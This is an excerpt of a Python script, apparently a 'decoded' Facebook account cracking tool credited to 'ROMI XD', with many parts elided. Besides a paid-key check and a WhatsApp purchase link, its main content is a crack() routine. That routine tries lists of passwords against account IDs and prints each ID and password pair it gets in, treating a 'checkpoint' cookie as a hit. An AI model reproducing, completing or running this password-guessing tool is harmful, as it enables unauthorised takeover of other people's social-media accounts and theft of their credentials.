#DECODED BY : JALAL AHMED ROMI
#GITHUB : https://github.com/ROMI-404
#--------------------------------------------------------------------------#
#
#-----------------[ IMPORT-MODULE ]-------------------
...
def Subscraption():
	...
	os.system('clear')
	banner()
	r1=requests.get("https://github.com/akram11241/Trick/blob/main/Trick.txt").text
	if key1 in r1:
		os.system('clear')
		banner()
		menu()
		...
		print ("")
		print (" \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m Your Key : "+XD+key1)
		print ("")
		
		input(" \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m\033[1;32m Enter To Send Key")
		time.sleep(3.5)
		tks = 'DEAR%20SIR%20I%20WANT%20TO%20BUY%20YOUR%20PRO-Z%20PAID%20TOOL%20%20%20%20%20%20%20%20%20%20%20'+XD+''+key1
		os.system('am start https://wa.me/+8801789193194?text=' + tks) 
		#Subscraption()
...
def banner():
	print(f"""
           ...
           \33[1;31m  d8888b.  .d88b.  .88b  d88. d888888b
           \33[1;32m 88  `8D .8P  Y8. 88'YbdP`88   `88'   
          \33[1;33m  88oobY' 88    88 88  88  88    88    
           \33[1;34m88`8b   88    88 88  88  88    88    
          \33[1;35m88 `88. `8b  d8' 88  88  88   .88.   
            \33[1;36m88   YD  `Y88P'  YP  YP  YP Y888888P 
\x1b[38;5;46m______________________________________________________

 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m DEVELOPER : 🔥ROMI XD🔥
 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m FACEBOOK  :   ROMI XD
 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m GITHUB    :   ROMI149
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [ROMI] {h}{loop}|{len(id)} | {h}{ok} ")
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				#print ()
				print(f'\r\r\x1b[38;5;46m[ROMI-XD-OK💉] '+idf+ ' | '+pw+'')
